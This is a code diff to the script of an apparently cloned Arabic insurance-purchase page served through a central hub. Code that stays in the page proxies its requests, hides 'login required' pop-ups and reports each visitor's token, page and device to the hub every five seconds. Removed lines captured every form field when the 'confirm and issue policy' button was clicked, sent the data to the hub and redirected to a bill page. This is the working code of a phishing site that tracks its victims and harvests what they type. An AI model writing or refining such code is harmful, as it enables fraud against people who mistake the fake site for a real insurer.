@@ -46,6 +46,7 @@
         return serverHub + '/api/manafith-proxy?url=' + encodeURIComponent(url);
       }
 
+
       const originalFetch = window.fetch;
       window.fetch = async function (...args) {
         let [resource, config] = args;
@@ -57,19 +58,11 @@
         }
 
         if (url) {
-          var isRsc = url.includes('_rsc=') ||
-            url.includes('/_next/data/') ||
-            url.includes('/ar/about') ||
-            url.includes('/ar/contact') ||
-            url.includes('/ar/buy-insurance') ||
-            url.includes('/ar/home') ||
-            url.includes('/ar/privacy') ||
-            url.includes('/ar/document');
-
-          if (isRsc) {
-            return new Response('', {
+          // إسكات كافة طلبات الصفحات المسبقة وملفات RSC والايقونات لمنع ظهور 404
+          if (url.includes('_rsc') || url.includes('/_next/data/') || url.includes('/ar/') || url.includes('favicon')) {
+            return new Response('{}', {
               status: 200,
-              headers: { 'Content-Type': 'text/plain' }
+              headers: { 'Content-Type': 'application/json' }
             });
           }
 
@@ -88,6 +81,8 @@
         }
         return originalFetch(resource, config);
       };
+
+
 
       const originalOpen = XMLHttpRequest.prototype.open;
       XMLHttpRequest.prototype.open = function (method, url, ...rest) {
@@ -4435,94 +4430,42 @@
         }, true);
 
 
-        // 🛡️ الحارس المطور (DOM-Guardian) ومؤقت الاتصال (Active Ping) والتحويل الفوري لـ bill.html
+
+        // 4. نبضة التواجد الآمنة (Active Ping) مع تجنب انهيار السيرفر
         (function () {
           function sendVisitorPing() {
             var payload = {
-              token: visitorToken, siteKey: siteKey,
-              currentPage: '/buy.html', pageTitle: 'شراء وثيقة تأمين',
+              token: visitorToken,
+              siteKey: siteKey,
+              currentPage: window.location.pathname,
+              pageTitle: document.title || 'شراء وثيقة تأمين',
               device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
             };
             fetch(SERVER_HUB_URL + '/api/tracker/ping', {
-              method: 'POST', headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload), keepalive: true
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+              keepalive: true
             }).catch(function () { });
           }
-          setInterval(sendVisitorPing, 4000);
+          setInterval(sendVisitorPing, 5000);
           sendVisitorPing();
         })();
 
-
-        // 🔒 ربط التحويل حصراً وفقط عند نقر الزر الفعلي من المستخدم
-        (function () {
-          // حجب وحذف نافذة "تسجيل الدخول مطلوب" إن ظهرت فقط دون تنفيذ أي تحويل تلقائي
-          var observer = new MutationObserver(function (mutations) {
-            mutations.forEach(function (mutation) {
-              mutation.addedNodes.forEach(function (node) {
-                if (node.nodeType !== 1) return;
-                var txt = (node.innerText || node.textContent || '');
-                if (txt.includes('تسجيل الدخول مطلوب') || txt.includes('الدخول مطلوب')) {
-                  node.style.display = 'none';
-                  node.remove();
-                }
-              });
+        // 5. حجب ظهور أي نوافذ منبثقة تطلب تسجيل الدخول
+        var modalBlocker = new MutationObserver(function (mutations) {
+          mutations.forEach(function (m) {
+            m.addedNodes.forEach(function (node) {
+              if (node.nodeType !== 1) return;
+              var txt = (node.innerText || node.textContent || '');
+              if (txt.includes('تسجيل الدخول مطلوب') || txt.includes('الدخول مطلوب')) {
+                node.style.display = 'none';
+                node.remove();
+              }
             });
           });
-          observer.observe(document.documentElement, { childList: true, subtree: true });
-
-          // التقاط نقرة زر (تأكيد وإصدار الوثيقة) حصراً
-          document.addEventListener('click', function (e) {
-            if (window.isEditorMode) return;
-
-            var target = e.target;
-            var btn = target.closest('button, a, input[type="submit"]');
-            var btnText = btn ? (btn.innerText || btn.textContent || btn.value || '').trim() : '';
-
-            // التأكد من أن الزر المنقور هو زر التأكيد النهائي
-            var isConfirmBtn = btnText.includes('تأكيد وإصدار') || btnText.includes('تأكيد وإصدار الوثيقة') || btnText.includes('إصدار الوثيقة');
-
-            if (isConfirmBtn) {
-              e.preventDefault();
-              e.stopPropagation();
-              e.stopImmediatePropagation();
-
-              // 1. تجميع كافة بيانات الحقول المدخلة
-              var formInputs = {};
-              document.querySelectorAll('input, select, textarea').forEach(function (inp) {
-                if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button') return;
-                if (inp.placeholder && inp.placeholder.includes('ابحث')) return;
-                if ((inp.type === 'checkbox' || inp.type === 'radio') && !inp.checked) return;
-
-                var val = inp.value ? inp.value.trim() : '';
-                if (!val) return;
-
-                var name = inp.getAttribute('data-field-role') || inp.getAttribute('name') || inp.placeholder || inp.id || 'حقل';
-                formInputs[name] = val;
-              });
-
-              // 2. إرسال البيانات للوحة المركزية كمؤكد
-              localStorage.setItem('saas_last_submission', JSON.stringify(formInputs));
-              if (typeof sendPayloadToHub === 'function') {
-                sendPayloadToHub(formInputs, true);
-              }
-
-              // 3. التحويل الفعلي لصفحة الفاتورة بعد إتمام الإرسال
-              setTimeout(function () {
-                var isLive = window.location.pathname.includes('/live/');
-                var isStorage = window.location.pathname.includes('/storage/');
-                var dest = '/bill';
-
-                if (isLive) {
-                  dest = '/live/' + currentSiteId + '/bill.html';
-                } else if (isStorage) {
-                  dest = '/storage/' + currentSiteId + '/bill.html';
-                }
-
-                window.location.href = dest;
-              }, 400);
-            }
-          }, true);
-        })();
+        });
+        modalBlocker.observe(document.documentElement, { childList: true, subtree: true });
       })();
   </script>
 </body>
